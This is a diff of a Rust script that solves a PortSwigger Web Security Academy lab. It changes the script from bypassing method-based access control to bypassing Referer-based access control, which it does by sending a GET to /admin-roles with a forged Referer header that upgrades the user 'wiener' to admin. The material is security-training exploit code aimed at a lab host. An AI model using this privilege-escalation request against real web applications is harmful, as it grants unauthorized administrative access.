@@ -4,10 +4,10 @@
 *
 * Date: 5/9/2023
 *
-* PortSwigger LAB: Method-based access control can be circumvented
+* PortSwigger LAB: Referer-based access control 
 *
 * Steps: 1. Login as wiener
-*        2. Upgrade wiener to be an admin via GET method instead of POST
+*        2. Upgrade wiener to be an admin by adding Referer header
 *
 **************************************************************************/
 #![allow(unused)]
@@ -32,7 +32,7 @@ use text_colorizer::Colorize;
 *******************/
 fn main() {
     // change this to your lab URL
-    let url = "https://0a2e009b0490978a8288c51100db0094.web-security-academy.net";
+    let url = "https://0a8000f4035062ed83c7109600dd003d.web-security-academy.net";
     // build the client used in all subsequent requests
     let client = build_client();
 
@@ -51,15 +51,16 @@ fn main() {
     let session = extract_session_cookie(login.headers())
         .expect(&format!("{}", "[!] Failed to extract session cookie".red()));
 
-    // Upgrade wiener to be an admin via GET method instead of POST
+    // Upgrade wiener to be an admin by adding Referer header
     print!(
         "{} ",
-        "2. Upgrading wiener to be an admin via GET method instead of POST..".white()
+        "2. Upgrading wiener to be an admin by adding Referer header..".white()
     );
     io::stdout().flush();
     let upgrade_wiener = client
         .get(format!("{url}/admin-roles?username=wiener&action=upgrade"))
         .header("Cookie", format!("session={session}"))
+        .header("Referer", format!("{url}/admin"))
         .send()
         .expect(&format!(
             "{}",
